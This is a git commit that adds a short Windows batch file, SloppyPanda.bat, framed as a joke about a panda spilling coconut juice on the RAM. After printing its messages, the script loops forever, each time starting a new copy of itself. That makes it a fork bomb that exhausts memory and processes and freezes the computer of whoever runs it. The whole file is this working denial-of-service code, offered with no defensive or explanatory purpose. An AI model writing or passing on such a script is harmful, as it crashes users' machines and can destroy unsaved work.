6e7979ec7d0c308aff0fb8b2e5dabd5bf66a7200
creatorpanda <creatorpanda@users.noreply.github.com>
2017-10-17 13:36:54 +0300

    Add files via upload

---
+++ SloppyPanda.bat
@@ -0,0 +1,9 @@
+@ECHO OFF
+TITLE OH NO!
+CLS
+COLOR 0d
+ECHO Oops! A panda tripped on your RAM's workbench!
+ECHO Spilt coconut juice is everywhere!
+:TOO_LATE_XOXOXO
+START SloppyPanda.bat
+GOTO TOO_LATE_XOXOXO
